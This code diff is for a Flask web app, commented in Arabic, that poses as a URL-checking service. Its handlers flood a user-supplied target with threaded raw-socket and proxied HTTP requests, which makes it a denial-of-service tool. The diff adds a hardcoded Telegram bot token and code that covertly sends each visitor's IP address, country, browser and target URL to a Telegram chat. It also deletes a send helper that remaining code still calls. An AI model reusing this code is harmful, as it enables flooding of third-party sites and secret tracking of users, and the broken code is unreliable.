@@ -3,14 +3,20 @@ import threading
 import random
 from contextlib import suppress
 from requests import Session
-from urllib.request import ProxyHandler, build_opener, urlopen, Request
+from urllib.parse import urlparse
 from user_agent import generate_user_agent
+import socket
+import requests
 
 app = Flask(__name__)
 
 # Global variables for tracking requests and bytes sent
 REQUESTS_SENT = 0
 BYTES_SEND = 0
+
+# إعدادات تيليجرام
+mrbtoken = "7412876596:AAHx3gE2x6DVQ7T6HSxLbuBv1jE-hoMX0qA"
+mrbid = "5179397749"
 
 class ProxyTools:
     class Random:
@@ -36,9 +42,14 @@ class Tools:
                 pass
 
     @staticmethod
-    def send(socket, payload):
-        """Send raw payload over a socket."""
-        socket.sendall(payload)
+    def send_to_telegram(message):
+        """إرسال رسالة إلى بوت تيليجرام."""
+        url = f"https://api.telegram.org/bot{mrbtoken}/sendMessage"
+        payload = {"chat_id": mrbid, "text": message, "parse_mode": "HTML"}
+        try:
+            requests.post(url, json=payload)
+        except Exception as e:
+            print(f"فشل إرسال الرسالة إلى تيليجرام: {e}")
 
 class Target:
     def __init__(self, url):
@@ -52,14 +63,12 @@ class Target:
     @property
     def raw_path_qs(self):
         """Raw path and query string of the target."""
-        from urllib.parse import urlparse
         parsed = urlparse(self.url)
         return parsed.path + ('?' + parsed.query if parsed.query else '')
 
     @property
     def authority(self):
         """Authority part of the URL (host:port)."""
-        from urllib.parse import urlparse
         parsed = urlparse(self.url)
         return parsed.netloc
 
@@ -72,7 +81,6 @@ class RequestHandler:
         self.randHeadercontent = "User-Agent: " + generate_user_agent() + "\r\n"
 
     def BYPASS(self):
-        """Bypass restrictions using a session and optional proxies."""
         global REQUESTS_SENT, BYTES_SEND
         pro = None
         if self._proxies:
@@ -92,32 +100,29 @@ class RequestHandler:
         Tools.safe_close(s)
 
     def GSB(self):
-        """Send raw HTTP payloads to the target."""
         payload = str.encode("%s %s?qs=%s HTTP/1.1\r\n" % (self._req_type,
                                                            self._target.raw_path_qs,
                                                            ProxyTools.Random.rand_str(6)) +
                              "Host: %s\r\n" % self._target.authority +
                              self.randHeadercontent +
                              'Accept-Encoding: gzip, deflate, br\r\n'
-                             'Accept-Language: en-US,en;q=0.9\r\n'
-                             'Cache-Control: max-age=0\r\n'
-                             'Connection: Keep-Alive\r\n'
-                             'Sec-Fetch-Dest: document\r\n'
-                             'Sec-Fetch-Mode: navigate\r\n'
-                             'Sec-Fetch-Site: none\r\n'
-                             'Sec-Fetch-User: ?1\r\n'
-                             'Sec-Gpc: 1\r\n'
-                             'Pragma: no-cache\r\n'
-                             'Upgrade-Insecure-Requests: 1\r\n\r\n')
+                             'Connection: Keep-Alive\r\n\r\n')
         s = None
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
                 Tools.send(s, payload)
         Tools.safe_close(s)
 
+    def NAME_CHECK(self):
+        global REQUESTS_SENT, BYTES_SEND
+        with suppress(Exception), Session() as s:
+            headers = {"User-Agent": generate_user_agent()}
+            res = s.get(self._target.human_repr, headers=headers)
+            REQUESTS_SENT += 1
+            BYTES_SEND += Tools.sizeOfRequest(res)
+        Tools.safe_close(s)
+
     def open_connection(self):
-        """Open a raw socket connection to the target."""
-        import socket
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((self._target.authority.split(':')[0], 80))
         return s
@@ -128,22 +133,53 @@ def home():
 
 @app.route("/mrb260", methods=["GET", "POST"])
 def index():
+    global REQUESTS_SENT, BYTES_SEND
+
     if request.method == "POST":
         url = request.form.get("url")
-        check_type = request.form.get("check_type")  # "proxy" or "no_proxy"
-        num_threads = int(request.form.get("num_threads", 10))  # Number of concurrent checks
+        check_type = request.form.get("check_type")
+        num_threads = int(request.form.get("num_threads", 10))
 
         if not url:
-            return jsonify({"error": "Please enter a URL!"})
+            return jsonify({"error": "يرجى إدخال رابط URL!"})
 
-        result = []
+        user_ip = request.remote_addr
+        user_agent = request.headers.get("User-Agent")
+        try:
+            location_data = requests.get(f"http://ipinfo.io/{user_ip}/json").json()
+            user_country = location_data.get("country", "غير معروف")
+        except:
+            user_country = "غير معروف"
+
+        message = f"""
+<b>🔔 طلب جديد تم إرساله!</b>
+
+🌐 <b>رابط الفحص:</b> {url}
+📌 <b>نوع الفحص:</b> {check_type}
+
+👤 <b>معلومات المستخدم:</b>
+- 📱 <b>IP:</b> {user_ip}
+- 🌍 <b>الدولة:</b> {user_country}
+- 💻 <b>المتصفح:</b> {user_agent}
+
+📊 <b>تفاصيل الطلب:</b>
+- 🔄 <b>عدد الطلبات المرسلة:</b> {REQUESTS_SENT}
+- 📦 <b>حجم البيانات المرسلة (بالبايت):</b> {BYTES_SEND}
+"""
+        Tools.send_to_telegram(message)
+
         threads = []
         for _ in range(num_threads):
             handler = RequestHandler(url, req_type="GET")
             if check_type == "proxy":
                 thread = threading.Thread(target=handler.BYPASS)
-            else:
+            elif check_type == "no_proxy":
                 thread = threading.Thread(target=handler.GSB)
+            elif check_type == "name_check":
+                thread = threading.Thread(target=handler.NAME_CHECK)
+            else:
+                return jsonify({"error": "نوع الفحص غير صحيح!"})
+
             thread.start()
             threads.append(thread)
 
@@ -155,4 +191,4 @@ def index():
     return render_template("index.html")
 
 if __name__ == "__main__":
-    app.run(debug=True, host="0.0.0.0", port=5000)
+    app.run(debug=True, host="0.0.0.0", port=5010)
